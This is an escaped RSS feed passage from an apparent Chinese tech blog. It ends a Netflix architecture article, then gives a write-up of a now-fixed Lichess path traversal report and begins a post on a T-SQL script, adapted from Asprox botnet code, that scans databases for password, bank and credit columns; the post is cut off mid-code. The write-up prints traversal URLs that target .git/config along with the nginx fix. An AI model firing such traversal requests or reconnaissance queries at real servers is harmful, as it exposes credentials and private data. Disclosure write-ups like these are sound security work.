&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;韧性设计哲学&#34;&gt;韧性设计哲学
&lt;/h2&gt;&lt;h3 id=&#34;混沌工程&#34;&gt;混沌工程
&lt;/h3&gt;&lt;p&gt;Netflix开创的Chaos Monkey工具会随机终止生产环境服务器，以此验证系统容错能力。核心原则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;假设所有环节都会故障&lt;/li&gt;
&lt;li&gt;在生产环境测试失效场景&lt;/li&gt;
&lt;li&gt;自动化恢复流程&lt;/li&gt;
&lt;li&gt;持续监控系统异常&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;韧性模式&#34;&gt;韧性模式
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;熔断器&lt;/strong&gt;：防护慢调用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;舱壁隔离&lt;/strong&gt;：遏制故障传播&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;智能超时&lt;/strong&gt;：避免长请求阻塞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;退避重试&lt;/strong&gt;：延迟后自动重试&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;数据库架构&#34;&gt;数据库架构
&lt;/h2&gt;&lt;h3 id=&#34;多语言持久化&#34;&gt;多语言持久化
&lt;/h3&gt;&lt;p&gt;不同数据库应对不同需求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Cassandra&lt;/strong&gt;：可扩展的用户观看数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MySQL&lt;/strong&gt;：交易型账单数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Elasticsearch&lt;/strong&gt;：快速搜索分析&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Redis&lt;/strong&gt;：高速缓存&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;最终一致性&#34;&gt;最终一致性
&lt;/h3&gt;&lt;p&gt;分布式环境下采用最终一致性模型。例如新增收藏的影片可能不会立即在所有设备同步，但数秒内会完成同步。&lt;/p&gt;
&lt;h2 id=&#34;机器学习推荐系统&#34;&gt;机器学习推荐系统
&lt;/h2&gt;&lt;h3 id=&#34;个性化算法&#34;&gt;个性化算法
&lt;/h3&gt;&lt;p&gt;Netflix使用数百个专用ML模型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;协同过滤&lt;/strong&gt;：基于相似用户喜好&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内容分析&lt;/strong&gt;：解析影片元数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;深度学习&lt;/strong&gt;：识别复杂模式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;上下文老虎机&lt;/strong&gt;：实时优化推荐&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;大规模ab测试&#34;&gt;大规模A/B测试
&lt;/h3&gt;&lt;p&gt;同时运行数千个实验：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;测试不同推荐算法&lt;/li&gt;
&lt;li&gt;验证UI设计变更&lt;/li&gt;
&lt;li&gt;评估视频编码策略&lt;/li&gt;
&lt;li&gt;分析内容展示位置&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;视频编码与传输&#34;&gt;视频编码与传输
&lt;/h2&gt;&lt;h3 id=&#34;自适应编码&#34;&gt;自适应编码
&lt;/h3&gt;&lt;p&gt;每个视频被编码为数百种变体，适配不同设备和网络条件。&lt;/p&gt;
&lt;h3 id=&#34;自适应流媒体&#34;&gt;自适应流媒体
&lt;/h3&gt;&lt;p&gt;播放器实时调整：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根据带宽动态调整画质&lt;/li&gt;
&lt;li&gt;预加载视频片段保证流畅&lt;/li&gt;
&lt;li&gt;优雅处理网络中断&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;经验教训&#34;&gt;经验教训
&lt;/h2&gt;&lt;h3 id=&#34;全球延迟优化&#34;&gt;全球延迟优化
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;边缘缓存&lt;/strong&gt;：热门内容就近部署&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;预测缓存&lt;/strong&gt;：ML预判用户观看意向&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;区域容灾&lt;/strong&gt;：数据中心故障时流量切换&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;带宽成本控制&#34;&gt;带宽成本控制
&lt;/h3&gt;&lt;p&gt;Open Connect通过以下方式降低支出：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;直连ISP&lt;/strong&gt;：建立对等协议&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;流量整形&lt;/strong&gt;：错峰分发内容&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;高效编解码&lt;/strong&gt;：AV1比H.264节省30%流量&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;通用架构经验&#34;&gt;通用架构经验
&lt;/h2&gt;&lt;h3 id=&#34;适用于各类团队的原则&#34;&gt;适用于各类团队的原则
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;从简单开始逐步扩展&lt;/li&gt;
&lt;li&gt;初期建立监控体系&lt;/li&gt;
&lt;li&gt;面向故障设计&lt;/li&gt;
&lt;li&gt;选择合适的数据库&lt;/li&gt;
&lt;li&gt;全面自动化&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;架构模式参考&#34;&gt;架构模式参考
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;API网关&lt;/strong&gt;：统一请求入口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;事件溯源&lt;/strong&gt;：存储事件而非状态&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CQRS&lt;/strong&gt;：读写分离优化性能&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Saga模式&lt;/strong&gt;：处理分布式事务&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;未来方向&#34;&gt;未来方向
&lt;/h2&gt;&lt;h3 id=&#34;边缘计算&#34;&gt;边缘计算
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;本地个性化&lt;/strong&gt;：在终端设备运行AI模型&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;动态转码&lt;/strong&gt;：实时视频编码&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;P2P传输&lt;/strong&gt;：用户间内容共享&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;新兴技术&#34;&gt;新兴技术
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;WebAssembly&lt;/strong&gt;：提升浏览器性能&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;GraphQL&lt;/strong&gt;：优化移动端API&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Kubernetes&lt;/strong&gt;：大规模容器编排&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;服务网格&lt;/strong&gt;：微服务通信治理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Netflix证明软件架构不仅是技术实现，更是战略资产。其工程文化和技术投资使其能够轻松扩展并超越竞争对手。当你下次观看Netflix时，请记得背后数千个协同工作的微服务、庞大的数据基础设施和全天候保障系统的工程师们。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Lila项目路径遍历漏洞分析：从漏洞发现到修复全过程</title>
        <link>http://localhost:1313/p/lila%E9%A1%B9%E7%9B%AE%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%8E%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%88%B0%E4%BF%AE%E5%A4%8D%E5%85%A8%E8%BF%87%E7%A8%8B/</link>
        <pubDate>Sun, 03 Aug 2025 08:33:48 +0800</pubDate>
        
        <guid>http://localhost:1313/p/lila%E9%A1%B9%E7%9B%AE%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%8E%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%88%B0%E4%BF%AE%E5%A4%8D%E5%85%A8%E8%BF%87%E7%A8%8B/</guid>
        <description>&lt;h1 id=&#34;lichess漏洞报告3181066---lila项目路径遍历漏洞&#34;&gt;Lichess漏洞报告#3181066 - Lila项目路径遍历漏洞
&lt;/h1&gt;&lt;h2 id=&#34;漏洞摘要&#34;&gt;漏洞摘要
&lt;/h2&gt;&lt;p&gt;在Lila项目中发现一个路径遍历漏洞，攻击者可通过操纵用户输入来访问服务器上的任意文件，突破预期目录结构限制。该漏洞可能暴露应用源代码、配置文件等敏感信息。&lt;/p&gt;
&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;通过构造特殊URL访问受限文件：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://lichess.org/assets/../build.sbt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://lichess.org/assets/../.git/config
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞影响&#34;&gt;漏洞影响
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;任意文件读取：可能泄露.git配置、应用配置(含密钥/凭证)、服务端源码&lt;/li&gt;
&lt;li&gt;信息泄露：暴露内部逻辑、部署细节、管理员配置&lt;/li&gt;
&lt;li&gt;间接提权：通过读取访问控制相关文件可能衍生其他攻击&lt;/li&gt;
&lt;li&gt;攻击侦察：了解内部文件结构有助于发现RCE或IDOR等漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;修复过程&#34;&gt;修复过程
&lt;/h2&gt;&lt;p&gt;开发团队采用Nginx配置修复方案：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$request_uri&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;~&lt;/span&gt; &lt;span class=&#34;sr&#34;&gt;&amp;#34;\.\./&amp;#34;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# 防止路径遍历 https://hackerone.com/reports/3181066
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;kn&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;404&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;生产环境配置&#34;&gt;生产环境配置
&lt;/h2&gt;&lt;p&gt;实际生产环境中/assets/请求由Nginx处理：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;/assets/&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;expires&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;1M&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;add_header&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;Cache-Control&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;public&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;add_header&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;Service-Worker-Allowed&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;add_header&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;Cross-Origin-Embedder-Policy&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;require-corp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;rewrite&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;^/assets/_\w&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;kn&#34;&gt;6}/(.+)$&amp;#34;&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;/assets/&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kn&#34;&gt;alias&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;/home/lichess-deploy/public/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2025-06-06 11:16 UTC：漏洞提交&lt;/li&gt;
&lt;li&gt;2025-06-07 09:24 UTC：确认为有效漏洞&lt;/li&gt;
&lt;li&gt;2025-06-09 07:39 UTC：提出初步修复方案&lt;/li&gt;
&lt;li&gt;2025-06-09 11:30 UTC：漏洞修复完成并公开&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>数据库敏感数据探测技术解析</title>
        <link>http://localhost:1313/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%8E%A2%E6%B5%8B%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 08:23:00 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%8E%A2%E6%B5%8B%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;发现有趣的数据库数据&#34;&gt;发现有趣的数据库数据
&lt;/h1&gt;&lt;p&gt;最近我开始阅读Justin Clarke的经典著作《SQL注入攻击与防御》。在开篇章节中，作者详细分析了Asprox僵尸网络的工作机制：它会扫描所有可访问的数据库，寻找文本类型的字段，并在现有数据中注入恶意JavaScript代码。&lt;/p&gt;
&lt;p&gt;通过研究源代码，我将其改造为搜索&amp;quot;敏感&amp;quot;字段名而非单纯文本字段，并输出检测结果而非注入代码。我定义的敏感字段包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;credit（信用）&lt;/li&gt;
&lt;li&gt;bank（银行）&lt;/li&gt;
&lt;li&gt;account（账户）&lt;/li&gt;
&lt;li&gt;password（密码）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最终实现的SQL查询如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;DECLARE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbname&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nvarchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;DECLARE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_cursor&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;CURSOR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FOR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;databases&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;OPEN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_cursor&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FETCH&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;NEXT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table_cursor&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;INTO&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbname&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WHILE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FETCH_STATUS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;BEGIN&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SET&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;SELECT &amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SET&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbname&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39; AS &amp;#39;&amp;#39;Database&amp;#39;&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;-- 其余字段选择逻辑
